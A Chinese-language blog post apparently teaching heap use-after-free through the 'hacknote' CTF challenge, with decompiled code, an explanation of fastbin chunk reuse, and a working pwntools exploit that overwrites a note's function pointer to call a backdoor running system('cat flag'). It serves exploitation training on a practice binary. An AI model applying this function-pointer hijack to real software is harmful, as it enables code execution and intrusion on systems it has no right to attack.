---
layout: post
title: 你不得不知道的use after free
category: system/Heap
date: 2023-9-23 21:04:32
---
Heap基础知识
<!-- more -->
[toc]
# use after free (UAF)

顾名思义，`use after free`是对已经被`free`的内容进行读写的操作。若用户在对指针进行`free`操作后没有将其置空，则该指针可能仍然可以被使用。（根据测试，`glibc2.23`中仍然可以使用，但在最新版本中对`free`后的指针使用会报错，具体修复版本待测试）

以一道例题`hacknote`为例子：

![image-20230209153120915](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202311211711655.png)

`32位程序`，经典菜单，这个程序有三种功能，即添加、删除、打印`note`。

`add_note`部分代码如下：

```c
unsigned int add_note()
{
  _DWORD *v0; // ebx
  signed int i; // [esp+Ch] [ebp-1Ch]
  int size; // [esp+10h] [ebp-18h]
  char buf; // [esp+14h] [ebp-14h]
  unsigned int v5; // [esp+1Ch] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  if ( count <= 5 )
  {
    for ( i = 0; i <= 4; ++i ) // 最多有五个note
    {
      if ( !notelist[i] )
      {
        notelist[i] = malloc(8u); // notelist[i]申请了8字节空间
        if ( !notelist[i] )
        {
          puts("Alloca Error");
          exit(-1);
        }
        *(_DWORD *)notelist[i] = print_note_content; // 前面四字节空间指向打印函数
        printf("Note size :");
        read(0, &buf, 8u);
        size = atoi(&buf);
        v0 = notelist[i]; // notelist[i]赋值给v0
        v0[1] = malloc(size);  // v0是DWORD，四字节，那么就是notelist[i]的后面四字节指向大小为size的一片空间
        if ( !*((_DWORD *)notelist[i] + 1) )
        {
          puts("Alloca Error");
          exit(-1);
        }
        printf("Content :");
        read(0, *((void **)notelist[i] + 1), size); // 赋值到notelist[i]的后面四字节指向的位置
        puts("Success !");
        ++count;
        return __readgsdword(0x14u) ^ v5;
      }
    }
  }
  else
  {
    puts("Full");
  }
  return __readgsdword(0x14u) ^ v5;
}
```

从上面可以看出，最多有5个note，每一个note为8字节，前四字节指向一个打印内容的函数，后四字节指向大小为size的一片空间，其中size和该空间的内容都是用户输入的。

接下来是`delete_note`部分：

```c
unsigned int del_note()
{
  int v1; // [esp+4h] [ebp-14h]
  char buf; // [esp+8h] [ebp-10h]
  unsigned int v3; // [esp+Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Index :");
  read(0, &buf, 4u);
  v1 = atoi(&buf);
  if ( v1 < 0 || v1 >= count )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( notelist[v1] )
  {
    free(*((void **)notelist[v1] + 1));
    free(notelist[v1]);
    puts("Success");
  }
  return __readgsdword(0x14u) ^ v3;
}
```

可以看到有两个`free`操作，第一个是对每一个note的后四字节指向的content，第二个是对note本身。

本题的核心就是这里在`free`过后是没有进行置零操作的，因此在老版本的`glibc`中，仍然可以对其进行操作。

再看最后的`print_note`：

```c
unsigned int print_note()
{
  int v1; // [esp+4h] [ebp-14h]
  char buf; // [esp+8h] [ebp-10h]
  unsigned int v3; // [esp+Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Index :");
  read(0, &buf, 4u);
  v1 = atoi(&buf);
  if ( v1 < 0 || v1 >= count )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( notelist[v1] )
    (*(void (__cdecl **)(_QWORD *))notelist[v1])(notelist[v1]); // 调用函数
  return __readgsdword(0x14u) ^ v3;
}
```

可以看到进行打印note的函数逻辑是，调用notelist[i]的前四个字节的函数，且将notelist[i]本身作为参数传递。

`print_note_content`函数，也就是每个notelist[i]的前四个字节的函数如下：

```c
int __cdecl print_note_content(int a1)
{
  return puts(*(const char **)(a1 + 4)); // puts函数对传进来的参数偏移4字节的地方输出
}
```

程序中可能用到的一处后门函数：

```c
int magic()
{
  return system("cat flag");
}
```

该后门函数入口地址是`0x08048986`。

现在我们已经明白整个程序的工作流程了。由于`free`后，程序并没有将指针置零，因此用户可以对已经被`free`的内容进行修改。那如何进行修改呢？实际上，当用户申请的`chunk`被`free`以后，该`chunk`会添加到`fastbin`中，若用户再次申请等同于该`chunk`大小的空间时，该`chunk`又会被分配给用户使用。在本程序中，用户只能在`add_note`中对`chunk`进行赋值，由此可以用如下流程进行`UAF`:

- 用户添加两块大小为0x10字节的note，分别设为note0和note1
- 申请每个note时，会先申请0x8字节用于存放note的两个指针。
- 删除note0，再删除note1。那么有四个空间被`free`，分别为：大小为0x8字节的note0的空间，note0后四字节指向的大小为0x10的content的空间，大小为0x8字节的note1的空间，note1后四字节指向的大小为0x10的content的空间。
- 由于fastbins是先进后出，因此fastbin链表中有：大小为0x10字节的note1->note0，大小为0x18字节的content1->content0。注意其中加上了header的0x8字节，32位下是0x8字节的header。
- 用户此时再申请一个大小为0x8的note，设为note2，先申请0x8字节用于存放note2的两个指针，那么这里申请到的0x8字节的空间实际上是note1。再申请0x8字节的空间用于存放note2后四字节指向的content，这里实际上申请到的是note0。
- 用户申请note2时可以对其进行赋值，赋值实际上是对note0进行修改。若对其赋值为`0x08048986`，那么note0的前四字节将会被修改为`0x08048986`。此时用户对note0进行打印操作，那么会调用`0x08048986`处的函数，也就是后门函数，成功执行漏洞。

`exp`如下：

```python
from pwn import *

context(log_level='debug')
sh = process('./hacknote')
elf = ELF('./hacknote')
libc = elf.libc

def debug():
    pid = util.proc.pidof(sh)[0]
    print('pid:{}'.format(pid))
    gdb.attach(pid)
    pause()

def add_note(size, content):
    sh.recvuntil('Your choice :')
    sh.sendline('1')
    sh.recvuntil('Note size :')
    sh.sendline(str(size))
    sh.recvuntil('Content :')
    sh.sendline(content)

def delete_note(index):
    sh.recvuntil('Your choice :')
    sh.sendline('2')
    sh.recvuntil('Index :')
    sh.sendline(str(index))

def print_note(index):
    sh.recvuntil('Your choice :')
    sh.sendline('3')
    sh.recvuntil('Index :')
    sh.sendline(str(index))

add_note(0x10, 'test')
add_note(0x10, 'what')
delete_note(0)
delete_note(1)
# debug()
add_note(0x8, p32(0x08048986))
print_note(0)
sh.interactive()
```

